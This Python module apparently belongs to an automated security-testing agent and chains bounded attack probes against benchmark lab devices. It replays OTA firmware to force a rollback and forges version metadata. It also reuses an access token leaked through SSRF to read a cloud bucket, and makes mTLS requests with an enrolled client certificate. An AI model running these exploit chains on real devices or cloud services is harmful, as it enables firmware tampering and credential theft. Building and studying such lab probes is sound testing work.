"""Bounded inter-device probes derived from recorded scanner observations."""
from functools import partial
from urllib.parse import urlsplit
import json
import logging
from src.agent.phases.analysis.context import AnalysisContext

log = logging.getLogger(__name__)


def _append_bounded_http_probe(
    context, scanner_results, scanner_tool_map,
    device: dict, kwargs: dict, result: str, *, service_key: str = "bounded", derived_from: dict | None = None
) -> None:
    device_id = str(device.get("id") or "")
    if not device_id:
        return
    data = scanner_results.setdefault(
        device_id, {"scan_results": {}, "findings": []}
    )
    data.setdefault("scan_results", {}).setdefault(service_key, []).append({
        "tool": "http_request",
        "kwargs": kwargs,
        "result": result,
        **({"derived_from_evidence_ref": derived_from.get("evidence_ref")} if derived_from is not None else {"evidence_ref": (scanner_tool_map["http_request"].last_observation() or {}).get("evidence_ref")}),
        "evidence_phase": 3,
        "authoritative": True,
    })
    from src.agent.scanner import extract_findings
    data["findings"] = extract_findings(
        data["scan_results"], device,
        compact=context.compact_local,
    )
    (context.run_dir / "03_scans" / f"{device_id}.json").write_text(
        json.dumps(data["scan_results"], indent=2, ensure_ascii=False),
        encoding="utf-8",
    )
    context.services.persist_findings(device, scanner_results)


def _probe_mtls(context, surface, scanner_results, scanner_tool_map, errors):
    # S16 enrollment returns the authorized disposable client identity.
    # Use that in-memory bundle for one bounded mTLS request against the
    # API; this avoids guessing filesystem paths or inventing a revoked
    # certificate. The response itself is enough to prove the contract.
    pki_enrollment = next(
        (device for device in surface
         if str(device.get("role") or "").casefold() == "pki_enrollment_server"),
        None,
    )
    pki_mtls = next(
        (device for device in surface
         if str(device.get("role") or "").casefold() == "pki_mtls_server"),
        None,
    )
    if pki_enrollment and pki_mtls:
        try:
            enrollment_data = scanner_results.get(pki_enrollment.get("id", ""), {})
            enrollment_entries = [
                entry
                for values in (enrollment_data.get("scan_results", {}) or {}).values()
                if isinstance(values, list)
                for entry in values
                if entry.get("tool") == "http_request"
            ]
            bundle = None
            for entry in enrollment_entries:
                result = json.loads(str(entry.get("result") or ""))
                if result.get("status_code") != 201:
                    continue
                payload = json.loads(str(result.get("body") or ""))
                if payload.get("certificate_pem") and payload.get("private_key_pem"):
                    bundle = payload
                    break
            if bundle:
                mtls_request = scanner_tool_map["mtls_request"]
                mtls_url = f"https://{pki_mtls.get('ip', '')}:8443/device/status"
                mtls_result = mtls_request(
                    url=mtls_url,
                    certificate_pem=str(bundle["certificate_pem"]),
                    private_key_pem=str(bundle["private_key_pem"]),
                    method="GET",
                )
                mtls_id = pki_mtls.get("id", "")
                mtls_data = scanner_results.setdefault(
                    mtls_id, {"scan_results": {}, "findings": []}
                )
                mtls_data.setdefault("scan_results", {}).setdefault("pki_mtls", []).append({
                    "tool": "mtls_request",
                    "kwargs": {"url": mtls_url, "method": "GET"},
                    "result": mtls_result,
                    "evidence_ref": (mtls_request.last_observation() or {}).get("evidence_ref"),
                    "evidence_phase": 3,
                    "authoritative": True,
                })
                from src.agent.scanner import extract_findings
                mtls_data["findings"] = extract_findings(
                    mtls_data["scan_results"], pki_mtls,
                    compact=context.compact_local,
                )
                (context.run_dir / "03_scans" / f"{mtls_id}.json").write_text(
                    json.dumps(mtls_data["scan_results"], indent=2, ensure_ascii=False),
                    encoding="utf-8",
                )
                context.services.persist_findings(pki_mtls, scanner_results)
        except (OSError, TypeError, ValueError, json.JSONDecodeError, KeyError) as exc:
            log.warning("S16 bounded mTLS probe unavailable: %s", exc)
            errors.append(f"mTLS supplemental probe: {type(exc).__name__}")


def _probe_ota(context, surface, scanner_results, scanner_tool_map, errors):
    append_probe = partial(_append_bounded_http_probe, context, scanner_results, scanner_tool_map)
    ota_repository = next(
        (device for device in surface
         if str(device.get("role") or "").casefold() == "ota_repository"),
        None,
    )
    ota_devices = [
        device for device in surface
        if str(device.get("role") or "").casefold() == "ota_device"
    ]
    if ota_repository and ota_devices:
        try:
            http_request = scanner_tool_map["http_request"]
            repo_data = scanner_results.get(ota_repository.get("id", ""), {})
            repo_entries = [
                entry
                for values in (repo_data.get("scan_results", {}) or {}).values()
                if isinstance(values, list)
                for entry in values
                if entry.get("tool") == "http_request"
            ]
            fixtures: dict[str, dict] = {}
            for entry in repo_entries:
                kwargs = entry.get("kwargs") or {}
                if urlsplit(str(kwargs.get("url") or "")).path != "/firmware":
                    continue
                try:
                    result = json.loads(str(entry.get("result") or ""))
                    body = json.loads(str(result.get("body") or ""))
                except (TypeError, ValueError, json.JSONDecodeError):
                    continue
                for item in body.get("artifacts", []):
                    if isinstance(item, dict) and item.get("version") and item.get("payload") and item.get("signature"):
                        fixtures[str(item["version"])] = item
            old = fixtures.get("1")
            current = fixtures.get("2")
            if old and current:
                device_a = next(
                    (device for device in ota_devices
                     if str(device.get("id") or "").endswith("device-a")),
                    ota_devices[0],
                )
                device_b = next(
                    (device for device in ota_devices
                     if str(device.get("id") or "").endswith("device-b")),
                    None,
                )
                base_url = lambda device: f"http://{device.get('ip', '')}:8080/install"
                # The vulnerable device signs payload bytes only. Test the
                # metadata mutation, then rollback, and restore v2.
                metadata_body = json.dumps({
                    "version": "999", "payload": old["payload"], "signature": old["signature"],
                })
                metadata_kwargs = {
                    "url": base_url(device_a), "method": "POST",
                    "headers": {"Content-Type": "application/json", "X-Benchmark-OTA-Test": "metadata"},
                    "body": metadata_body, "follow_redirects": False,
                }
                append_probe(device_a, metadata_kwargs, http_request(**metadata_kwargs), service_key="ota_cross_device")
                rollback_body = json.dumps({
                    "version": old["version"], "payload": old["payload"], "signature": old["signature"],
                })
                rollback_kwargs = {
                    "url": base_url(device_a), "method": "POST",
                    "headers": {"Content-Type": "application/json", "X-Benchmark-OTA-Test": "rollback"},
                    "body": rollback_body, "follow_redirects": False,
                }
                append_probe(device_a, rollback_kwargs, http_request(**rollback_kwargs), service_key="ota_cross_device")
                restore_kwargs = {
                    "url": base_url(device_a), "method": "POST",
                    "headers": {"Content-Type": "application/json", "X-Benchmark-OTA-Test": "restore"},
                    "body": json.dumps(current), "follow_redirects": False,
                }
                append_probe(device_a, restore_kwargs, http_request(**restore_kwargs), service_key="ota_cross_device")
                if device_b:
                    cross_kwargs = {
                        "url": base_url(device_b), "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "X-Benchmark-Cross-Device": "s17-device-a",
                        },
                        "body": json.dumps(current), "follow_redirects": False,
                    }
                    append_probe(device_b, cross_kwargs, http_request(**cross_kwargs), service_key="ota_cross_device")
        except (OSError, TypeError, ValueError, json.JSONDecodeError, KeyError) as exc:
            log.warning("S17 bounded OTA probes unavailable: %s", exc)
            errors.append(f"OTA supplemental probe: {type(exc).__name__}")


def _probe_cloud(context, surface, scanner_results, scanner_tool_map, errors):
    append_probe = partial(_append_bounded_http_probe, context, scanner_results, scanner_tool_map)
    cloud_metadata = next(
        (device for device in surface
         if str(device.get("role") or "").casefold() == "cloud_metadata_server"),
        None,
    )
    cloud_control = next(
        (device for device in surface
         if str(device.get("role") or "").casefold() == "cloud_control_plane"),
        None,
    )
    for cloud_web in surface:
        if (
            str(cloud_web.get("role") or "").casefold() != "cloud_web_server"
            or not cloud_metadata or not cloud_control
        ):
            continue
        try:
            http_request = scanner_tool_map["http_request"]
            web_data = scanner_results.get(cloud_web.get("id", ""), {})
            fetch_entry = next(
                (
                    entry for values in (web_data.get("scan_results", {}) or {}).values()
                    if isinstance(values, list)
                    for entry in values
                    if entry.get("tool") == "http_request"
                    and urlsplit(str((entry.get("kwargs") or {}).get("url") or "")).path == "/fetch"
                ),
                None,
            )
            if fetch_entry:
                fetch_result = json.loads(str(fetch_entry.get("result") or ""))
                fetch_body = json.loads(str(fetch_result.get("body") or ""))
                metadata_body = str(fetch_body.get("body") or "")
                metadata_payload = json.loads(metadata_body)
                token = str(metadata_payload.get("access_token") or "")
                if fetch_result.get("status_code") == 200 and token and metadata_payload.get("scope") == "object-admin":
                    metadata_kwargs = {
                        "url": f"http://{cloud_metadata.get('ip', '')}:8080/credentials",
                        "method": "GET",
                        "headers": {"X-Benchmark-Vantage": "ssrf"},
                        "follow_redirects": False,
                    }
                    append_probe(
                        cloud_metadata, metadata_kwargs,
                        json.dumps({"status_code": 200, "body": metadata_body}),
                        service_key="cloud_ssrf", derived_from=fetch_entry,
                    )
                    control_kwargs = {
                        "url": f"http://{cloud_control.get('ip', '')}:8080/bucket/city-secrets",
                        "method": "GET",
                        "headers": {"Authorization": f"Bearer {token}"},
                        "follow_redirects": False,
                    }
                    append_probe(
                        cloud_control, control_kwargs,
                        http_request(**control_kwargs),
                        service_key="cloud_ssrf",
                    )
        except (OSError, TypeError, ValueError, json.JSONDecodeError, KeyError) as exc:
            log.warning("S18 bounded SSRF/IAM probes unavailable: %s", exc)
            errors.append(f"SSRF/IAM supplemental probe: {type(exc).__name__}")


def supplement_scans(
    context: AnalysisContext, devices: list[dict], observations: dict,
    tools: dict, errors: list[str],
) -> None:
    _probe_mtls(context, devices, observations, tools, errors)
    _probe_ota(context, devices, observations, tools, errors)
    _probe_cloud(context, devices, observations, tools, errors)
